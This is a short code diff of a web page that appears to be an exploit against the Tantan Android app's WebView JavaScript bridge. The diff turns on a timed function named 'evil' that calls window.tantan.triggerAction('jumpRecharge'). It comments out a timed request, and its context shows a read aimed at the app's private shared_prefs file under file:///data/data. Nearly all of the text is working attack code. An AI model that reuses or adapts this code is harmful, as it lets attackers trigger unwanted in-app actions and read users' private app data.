@@ -14,11 +14,11 @@ function gotowhite(){
 }
 
 function evil(){
-	document.getElementById("content").innerText = 'call canIUse : '+window.tantan.canIUse('cc') + ' , and : ' + window.tantan.triggerAction('c','d');
+	document.getElementById("content").innerText = 'call canIUse : '+window.tantan.canIUse('cc') + ' , and : ' + window.tantan.triggerAction('jumpRecharge','d');
 }
 
 setInterval(gotowhite,5);//5毫秒
-//setTimeout(evil,3000);//倒计时3秒
+setTimeout(evil,3000);//倒计时3秒
 	
 
 function createXHR(){
@@ -54,7 +54,7 @@ sendGetRequest('file:///data/data/com.p1.mobile.putong/shared_prefs/putongPref_b
 });
 }
 	
-setTimeout(sendRequest,3000);//倒计时3秒
+//setTimeout(sendRequest,3000);//倒计时3秒
 	
 </script>
 	
